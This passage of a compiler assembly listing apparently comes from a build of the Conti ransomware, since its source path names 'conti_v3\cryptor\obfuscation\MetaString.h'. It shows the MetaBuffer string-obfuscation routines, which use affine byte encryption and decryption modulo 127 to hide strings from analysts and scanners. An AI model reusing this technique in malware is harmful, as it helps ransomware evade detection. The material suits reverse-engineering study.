  00a4b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a50	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a57	88 41 3e	 mov	 BYTE PTR [rcx+62], al
  00a5a	b8 01 00 00 00	 mov	 eax, 1
  00a5f	48 6b c0 3e	 imul	 rax, rax, 62		; 0000003eH
  00a63	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a6a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a6e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a75	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a7a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a81	88 41 3f	 mov	 BYTE PTR [rcx+63], al
  00a84	b8 01 00 00 00	 mov	 eax, 1
  00a89	48 6b c0 3f	 imul	 rax, rax, 63		; 0000003fH
  00a8d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a94	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a98	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a9f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00aa4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aab	88 41 40	 mov	 BYTE PTR [rcx+64], al
  00aae	b8 01 00 00 00	 mov	 eax, 1
  00ab3	48 6b c0 40	 imul	 rax, rax, 64		; 00000040H
  00ab7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00abe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ac2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b09	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00b0d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv560[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00b13	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00b1a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00b21	5f		 pop	 rdi
  00b22	5d		 pop	 rbp
  00b23	c3		 ret	 0
??0?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 26	 sub	 eax, 38			; 00000026H
  0002d	6b c0 d9	 imul	 eax, eax, -39		; ffffffffffffffd9H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 0d	 imul	 eax, eax, 13
  0002d	83 c0 26	 add	 eax, 38			; 00000026H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 36	 cmp	 QWORD PTR i$1[rbp], 54	; 00000036H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv476 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0N@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<13,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
